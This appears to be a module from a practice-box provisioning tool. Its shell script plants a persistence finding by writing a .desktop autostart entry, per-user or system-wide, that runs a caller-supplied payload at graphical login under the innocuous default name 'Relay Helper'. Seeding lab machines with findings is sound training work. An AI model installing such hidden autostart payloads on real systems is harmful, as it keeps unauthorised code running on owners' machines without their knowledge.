name: desktop-autostart
description: Practice-box persistence finding: writes a .desktop autostart launcher at a caller-chosen path (per-user ~/.config/autostart or system-wide /etc/xdg/autostart) that runs a payload at graphical login. Vars: DEST (required, full .desktop path); EXEC (required); NAME (optional); OWNER (optional, chown the file).
script:
#!/bin/sh
set -eu
: "${DEST:?DEST is required}"
: "${EXEC:?EXEC is required}"
name="${NAME:-Relay Helper}"
install -d -m 0755 "$(dirname -- "$DEST")"
cat > "$DEST" <<EOF
[Desktop Entry]
Type=Application
Name=$name
Exec=$EXEC
X-GNOME-Autostart-enabled=true
OnlyShowIn=XFCE;
EOF
chmod 0644 "$DEST"
if [ -n "${OWNER-}" ]; then
  chown "$OWNER":"$OWNER" "$DEST" 2>/dev/null || chown "$OWNER" "$DEST" 2>/dev/null || true
fi
